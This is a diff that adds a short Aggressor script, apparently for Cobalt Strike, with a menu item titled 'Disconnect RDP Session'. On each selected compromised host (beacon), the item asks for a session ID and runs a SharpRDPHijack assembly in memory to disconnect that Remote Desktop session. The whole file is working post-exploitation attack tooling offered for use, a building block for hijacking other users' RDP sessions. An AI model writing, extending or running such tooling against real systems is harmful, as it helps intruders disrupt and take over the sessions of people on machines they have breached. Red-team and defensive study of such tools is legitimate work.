@@ -1,0 +1,16 @@
+# SharpRDPHijack Disconnect Session
+item "Disconnect RDP Session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpdisconnect($bid);
+		}
+}
+
+
+
+# SharpRDPHijack Disconnect Session
+sub rdpdisconnect{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --disconnect");
+}, $bids => $1)); 
+}
